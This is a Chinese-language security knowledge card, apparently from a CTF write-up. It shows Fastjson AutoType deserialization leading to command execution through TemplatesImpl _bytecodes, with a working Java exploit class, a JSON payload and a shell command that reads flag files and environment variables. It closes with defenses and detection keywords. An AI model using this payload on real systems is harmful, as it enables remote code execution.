---
id: web-java-deser-fastjson-templatesimpl-batchupdate-rce
title: Fastjson parseObject 开启 AutoType：TemplatesImpl _bytecodes 在 batchUpdate 触发命令执行
type: scenario
domain: web
path: web/java/deserialization/fastjson
technique: fastjson-templatesimpl-bytecode-rce
tags:
- web
- java
- fastjson
- deserialization
- autotype
- templatesimpl
- bytecode
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V115
  verified_at: '2026-11-06T01:51:08+08:00'
  notes: 已对照原文 §21 文档编辑系统核对：/api/admin/doc/batchUpdate 用 Fastjson parseObject 开 @type、TemplatesImpl _bytecodes/_name/_tfactory/_outputProperties、AbstractTranslet 静态块执行命令、写 upload/flag_out.txt 后经 /api/doc/preview 读取均一致；原文有实测 flag，未本机复跑。原文未标注 Fastjson 版本，未设置 affected_versions。
url: /docs/web/java/deserialization/fastjson/web-java-deser-fastjson-templatesimpl-batchupdate-rce/
draft: false
kb_aliases:
- 文档编辑系统
- Fastjson TemplatesImpl
- _bytecodes
- AbstractTranslet
- batchUpdate
- parseObject AutoType
---

## 一句话结论

文档编辑系统的管理员批量更新接口 `/api/admin/doc/batchUpdate` 用 Fastjson `parseObject` 解析 JSON 且开启 `@type`，攻击者可在 `x` 字段放入 `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`，通过 `_bytecodes` 提供继承 `AbstractTranslet` 的恶意类，反序列化时 `TemplatesImpl` 的 getter/初始化逻辑触发静态代码块执行命令；把 flag 写入 `upload/` 目录，再用普通文档预览接口读回。

## 原理

- **Fastjson AutoType**：`JSON.parseObject(input)` 默认关闭 AutoType，但配置 `Feature.SupportAutoType` 或使用 `parseObject(text, Object.class, Feature.SupportAutoType)` 时，会按 `@type` 加载并实例化任意类。
- **TemplatesImpl**：`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl` 的 `_bytecodes` 字段保存 Java 字节码；Fastjson 在设置属性/调用 getter 时会触发 `TemplatesImpl` 的 `getOutputProperties()`/`newTransformer()` 路径，内部用 `defineClass` 加载 `_bytecodes` 并实例化，静态初始化块/构造器执行恶意代码。
- **恶意类约束**：类必须继承 `com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`，并实现两个 `transform` 方法；静态块中用 `Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd})` 执行命令。
- **回显通道**：应用有文档创建/上传接口，可写 `upload/` 目录；payload 把命令输出重定向到 `upload/flag_out.txt`，再通过 `/api/doc/preview?file_path=flag_out.txt` 读取，形成稳定回显。
- **为什么成立**：`TemplatesImpl` 是 JDK 自带类，不依赖第三方 gadget；只要 AutoType 开启或可绕过，`_bytecodes` 就是直接的字节码执行原语。

## 触发条件

- 目标使用存在 AutoType 风险的 Fastjson 版本，且 `parseObject` 开启了 `SupportAutoType`/`@type` 解析。
- 攻击者可访问触发反序列化的接口（如管理员 `batchUpdate`），并能控制 JSON 中的 `@type` 字段。
- 目标 JDK 含 `TemplatesImpl`/Xalan（JDK 8 常见）。
- 应用有可写目录/上传目录可作为命令输出回显通道。

## 利用步骤

1. 登录管理员，确认 `batchUpdate` 接口接收 JSON 并解析嵌套对象。
2. 编写继承 `AbstractTranslet` 的恶意类，静态块执行命令把 flag 写到 `upload/flag_out.txt`。
3. 用 JDK 8 `javac -XDignore.symbol.file -source 8 -target 8` 编译，读取 `.class` 并 base64。
4. 构造 JSON：`{"docId":...,"x":{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["<b64>"],"_name":"Exploit","_tfactory":{},"_outputProperties":{}}}`。
5. POST 到 `/api/admin/doc/batchUpdate` 触发；等待命令执行。
6. 访问 `/api/doc/preview?file_path=flag_out.txt`（或 `../upload/flag_out.txt`）读取 flag。

## PoC

恶意 Java 类（核心）：

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class Exploit extends AbstractTranslet {
    static {
        try {
            String cmd = "(cat /flag /flag.txt /app/flag 2>/dev/null; env | grep -i flag) > upload/flag_out.txt";
            Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
        } catch (Exception ignored) {}
    }
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}
}
```

JSON payload：

```json
{
  "docId": 1,
  "title": "fastjson",
  "status": "draft",
  "content": "fastjson",
  "x": {
    "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
    "_bytecodes": ["<base64_class>"],
    "_name": "Exploit",
    "_tfactory": {},
    "_outputProperties": {}
  }
}
```

## 变体与关联

- AutoType 关闭时可用 1.2.47 类缓存、fastjson2 FNV 碰撞、`expectClass` 绕过等（见关联卡）。
- `TemplatesImpl` 可换成 `JdbcRowSetImpl` JNDI、C3P0、BCEL、Spring `ClassPathXmlApplicationContext` 等 gadget。
- 回显可换成 DNS/HTTP 外带、写入静态目录、错误页/日志。
- 关联：Fastjson AutoType 系列、TemplatesImpl/CC4、Java 反序列化命令执行卡。

## 检测与防御

- 升级 Fastjson 到安全版本，关闭 `SupportAutoType`，使用 `safeMode`/白名单；不要反序列化用户可控的 `@type`。
- 对 `parseObject` 使用固定 DTO 类型并校验字段；禁止 `TemplatesImpl`、`JdbcRowSetImpl` 等危险类。
- 上传/文档目录不可执行、不可作为任意写回显通道；命令执行最小权限。
- 检测：JSON 中出现 `@type`、`TemplatesImpl`、`_bytecodes`、`JdbcRowSetImpl`、`java.lang.Runtime`；`batchUpdate` 请求体异常嵌套；上传目录出现命令输出文件。
